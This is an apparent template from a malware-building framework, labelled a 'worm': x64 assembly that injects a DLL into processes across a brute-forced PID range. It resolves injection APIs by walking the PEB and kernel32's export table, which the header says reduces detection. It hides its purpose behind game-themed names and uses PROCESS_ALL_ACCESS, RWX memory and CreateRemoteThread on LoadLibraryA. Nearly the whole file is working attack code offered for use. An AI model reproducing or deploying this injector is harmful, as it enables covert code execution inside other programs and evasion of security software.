#!name##BruteDLL
#!types##worm
#!info##[W] [x64] Assembler DLL Injector. It looks for a process in the specified range and tries to inject a DLL into its memory. The worm uses dynamic function import for injection, reduces detection. It accepts DLL modules.
#!globalVar##COMPILER##mingw-x64##Compiler name
#!globalVar##TARGET_OS##windows##Target OS
#!globalVar##NO_DLL##True##Not include DLL
#!system_FLAG##[W]
#!processWorm##BasicCombo
#!lang##asm
#!banned##shadow##starter
#!acceptMods##dll
#!reqVar##BDL_start_pid##The PID number from which the process search begins.##int
#!reqVar##BDL_max_pid##Last PID number of the process.##int
#!setVar##BDL_start_pid##2100##int
#!setVar##BDL_max_pid##5000##int
#!reqVar##DLL_NAME##Name for dll file##str
#!setVar##DLL_NAME##game.dll##str
#!options##WORM_default_dll##True


bits 64
default rel

extern ExitProcess
extern lstrcmpA
extern printf
extern GetLastError
extern WaitForSingleObject
extern CloseHandle
extern GetModuleFileNameA
extern PathRemoveFileSpecA
extern PathCombineA
extern lstrlenA

section .data
    player1: db {{TOOL.asm_hex_bytes("OpenProcess")}} ; "OpenProcess"
    player2: db {{TOOL.asm_hex_bytes("VirtualAllocEx")}} ; "VirtualAllocEx"
    player3: db {{TOOL.asm_hex_bytes("WriteProcessMemory")}} ; "WriteProcessMemory"
    player4: db {{TOOL.asm_hex_bytes("CreateRemoteThread")}} ; "CreateRemoteThread"
    player5: db {{TOOL.asm_hex_bytes("LoadLibraryA")}} ; "LoadLibraryA"
    
    lwidth: equ {{BDL_start_pid}} ; start process PID
    lheight: equ {{BDL_max_pid}}    ; last process PID
    
    file_name: db "{{DLL_NAME}}", 0

section .bss
    exp_tab: resq 1     ; Export Table address
    ; exp_tab + 0x14    - number of functions   (dword)
    ; exp_tab + 0x20    - Function Name RVA (dword)
    ; exp_tab + 0x24    - AddressOfNameOrdinals RVA (word)
    ; exp_tab + 0x1c    - AddressOfFunctions RVA
    
    master: resq 1    ; kernel32.dll adress
    
    raw_file_path: resb 512 ; buffer for raw path file
    file_path: resb 512 ; buffer for file path
    hiscore: resq 1 ; buffer for file_path length
    pscore: resq 1  ; buffer for counter
    
    proc_handle: resq 1 ; process handle
    mem_addr: resq 1    ; memory addr
    bwrite: resq 1  ; bytes written to process
    
    fp1: resq 1 ; OpenProcess
    fp2: resq 1 ; VirtualAllocEx
    fp3: resq 1 ; WriteProcessMemory
    fp4: resq 1 ; CreateRemoteThread
    fp5: resq 1 ; LoadLibraryA
    
section .text
    global main
    
main:
    sub rsp, 8  ; allign stack
    
    sub rsp, 16 ; func space
    call startGame
    call PlayGame
    call Exit

PlayGame:
    mov rbp, rsp
    push rbp
    
    lea rbx, [pscore]
    mov qword [rbx], lwidth
    .game:
        lea r12, [pscore]
        mov r12, [r12]
        cmp r12, lheight
        je .end
          
        sub rsp, 16 ; func space
        call _playGame
        add rsp, 16 ; restore stack
        cmp rax, 1
        je .end
        
        inc r12
        lea rbx, [pscore]
        mov [rbx], r12
        jmp .game
        
    .end:
        pop rbp
        ret
    
startGame:
    mov rbp, rsp
    push rbp
    sub rsp, 16 ; func space
    call TableScore
    call prepareGame
    call GetPlayer
    add rsp, 16 ; restore stack
    pop rbp
    ret


GetPlayer:
    mov rbp, rsp
    push rbp
    
    sub rsp, 16 ; func space
    mov r12, player1
    call FindPlayer
    lea rbx, [fp1]
    mov [rbx], rax  ; save OpenProcess addr
    mov r12, player2
    call FindPlayer
    lea rbx, [fp2]
    mov [rbx], rax  ; save VirtualAllocEx addr
    mov r12, player3
    call FindPlayer
    lea rbx, [fp3]
    mov [rbx], rax  ; save WriteProcessMemory addr
    mov r12, player4
    call FindPlayer
    lea rbx, [fp4]
    mov [rbx], rax  ; save CreateRemoteThread addr
    mov r12, player5
    call FindPlayer
    lea rbx, [fp5]
    mov [rbx], rax  ; save LoadLibraryA addr
    
    
    add rsp, 16 ; restore stack
    
    pop rbp
    ret

prepareGame:
    mov rbp, rsp
    push rbp
    
    sub rsp, 32 ;shadow space
    mov rcx, 0
    lea rdx, [raw_file_path]
    mov r8, 512
    call GetModuleFileNameA
    lea rcx, [raw_file_path]
    call PathRemoveFileSpecA
    lea rcx, [file_path]
    lea rdx, [raw_file_path]
    mov r8, file_name
    call PathCombineA
    lea rcx, [file_path]
    call lstrlenA
    lea rbx, [hiscore]
    mov [rbx], rax
    add rsp, 32
    
    pop rbp
    ret

_playGame:
    ; IN r12 - pid process
    ; OUT: rax - '1' success, '0' fail
    mov rbp, rsp
    push rbp
    
    ; OpenProcess
   ; HANDLE OpenProcess(
;  [in] DWORD dwDesiredAccess,
;  [in] BOOL  bInheritHandle,
;  [in] DWORD dwProcessId
;);
    sub rsp, 32 ; shadow space
    mov rcx, 0x1F0FFF   ;PROCESS_ALL_ACCESS
    mov rdx, 0
    mov r8, r12
    lea rbx, [fp1]
    mov rbx, [rbx]
    call rbx
    add rsp, 32 ; restore stack
    cmp rax, 0
    je .error
    lea rbx, [proc_handle]
    mov [rbx], rax  ; save process handle
    
   ; ------ VirtualAllocEx ------------
  ; LPVOID VirtualAllocEx(
;  [in]           HANDLE hProcess,
;  [in, optional] LPVOID lpAddress,
;  [in]           SIZE_T dwSize,
;  [in]           DWORD  flAllocationType,
;  [in]           DWORD  flProtect
;);

    sub rsp, 40 ;shadow space
    mov rcx, rax
    mov rdx, 0
    lea r8, [hiscore]
    mov r8, [r8]
    mov r9, 0x00001000 | 0x00002000 ; MEM_COMMIT | MEM_RESERVE
    mov qword [rsp+32], 0x40  ; PAGE_EXECUTE_READWRITE
    lea rbx, [fp2]
    mov rbx, [rbx]
    call rbx    ; execute function
    add rsp, 40 ;restore stack
    cmp rax, 0
    je .error
    lea rbx, [mem_addr]
    mov [rbx], rax  ; save memory address
    
    
    ; ----------------- WriteProcessMemory ----------------------
;    BOOL WriteProcessMemory(
;  [in]  HANDLE  hProcess,
;  [in]  LPVOID  lpBaseAddress,
;  [in]  LPCVOID lpBuffer,
;  [in]  SIZE_T  nSize,
;  [out] SIZE_T  *lpNumberOfBytesWritten
;);
    
    sub rsp, 40 ;shadow space
    lea rcx, [proc_handle]
    mov rcx, [rcx]
    mov rdx, rax
    lea r8, [file_path]
    lea r9, [hiscore]
    mov r9, [r9]
    lea rbx, [bwrite]
    mov qword [rsp+32], rbx
    lea rbx, [fp3]
    mov rbx, [rbx]
    call rbx    ; execute function
    add rsp, 40 ; restore stack
    cmp rax, 0
    je .error
    
   
    
    ;-------------------- CreateRemoteThread -------------------
    ;HANDLE CreateRemoteThread(
;  [in]  HANDLE                 hProcess,
;  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
;  [in]  SIZE_T                 dwStackSize,
;  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
;  [in]  LPVOID                 lpParameter,
;  [in]  DWORD                  dwCreationFlags,
;  [out] LPDWORD                lpThreadId
;);

    sub rsp, 56 ;shadow space
    lea rcx, [proc_handle]
    mov rcx, [rcx]
    mov rdx, 0
    mov r8, 0
    lea r9, [fp5]
    mov r9, [r9]    ; pointer to LoadLibraryA
    lea rbx, [mem_addr]
    mov rbx, [rbx]
    mov qword [rsp+32], rbx
    mov qword [rsp+40], 0
    mov qword [rsp+48], 0
    lea rbx, [fp4]
    mov rbx, [rbx]
    call rbx    ; execute function
    add rsp, 56 ; restore stack
    cmp rax, 0
    je .error
    
    sub rsp, 32
    mov rcx, rax
    mov rdx, 0xffffffff
    call WaitForSingleObject
    add rsp, 32
    
    sub rsp, 32
    lea rcx, [proc_handle]
    mov rcx, [rcx]
    call CloseHandle
    add rsp, 32
    
    
    .end:
    pop rbp
    ret
    
    .error:
        xor rax, rax    ; return FAIL
        jmp .end
    
TableScore:
    mov rbp, rsp
    push rbp
    
    mov rbx, gs:[0x60]  ; Get address of PEB struct
    mov rbx, [rbx+0x18] ; Get PEB_LDR_DATA address
    mov rbx, [rbx+0x20] ; Get InMemoryOrderModuleList
    mov rbx, [rbx]  ; 1st entry in InMemoryOrderModuleList (ntdll.dll)
    mov rbx, [rbx]  ; 2st entry in InMemoryOrderModuleList (kernel32.dll)
    mov rdi, [rbx+0x20]  ; Get kernel32.dll address
    lea rax, [master]
    mov [rax], rdi  ; save kernel32.dll address
    
    xor rbx, rbx
    mov ebx, [rdi+0x3c]
    add rbx, rdi    ; RVA PE + kernel32
    add rbx, 0x88   ; EXPORT TABLE
    
    mov ebx, [rbx]  ; RVA Export Table
    add rbx, rdi    ; RVA ET + kernel32
    lea rax, exp_tab
    mov [rax], rbx  ; save Export Table address
    
    pop rbp
    ret

FindPlayer:
    ; IN: r12 - function name
    ; OUT: rax - function addr or 0
    mov rbp, rsp
    push rbp
    
    ; r13 - kernel32 addr
    ; r14 - Export Table addr
    ; rbx - Number of functions
    ; rsi - counter
    
    lea r13, [master]
    mov r13, [r13]
    lea r14, [exp_tab]
    mov r14, [r14]
    mov ebx, [r14 + 0x14]   ; get number of function
    
    
    xor rsi, rsi    ; counter = 0
    .loop:
        cmp rsi, rbx
        je .not_find
        
        ; get TAB: Function Name
        mov r15d, [r14 + 0x20]  ; get Function Name RVA
        add r15, r13    ; add kernel32 addres
        mov r15d, [r15 + 4 * rsi]
        add r15, r13    ; add kernel32 address
        ; compare string
        sub rsp, 32 ;shadow space
        mov rcx, r12
        mov rdx, r15
        call lstrcmpA
        add rsp, 32 ;restore stack
        cmp rax, 0
        je .ffinded
        
        inc rsi ; counter + 1
        jmp .loop
              
    .end:
    pop rbp
    ret
    
    .ffinded:
        mov eax, [r14 + 0x24]   ; get AddressOfNameOrdinals RVA
        add rax, r13    ; add kernel32 addr
        xor rbx, rbx
        mov bx, [rax + 2 * rsi] ; get function index (word 2 bytes)
        mov eax, [r14 + 0x1c]   ; Get AddressOfFunctions RVA
        add rax, r13    ; add kernel32 addr
        mov ebx, [rax + 4 * rbx]    ; function address RVA
        add rbx, r13    ; add kernel32 addr        
        mov rax, rbx    ; return Function address
        jmp .end
        
    .not_find:
        xor rax, rax ; return FAIL
        pop rbp
        ret
    
Exit:
    sub rsp, 32 ;shadow space
    mov rcx, 0
    call ExitProcess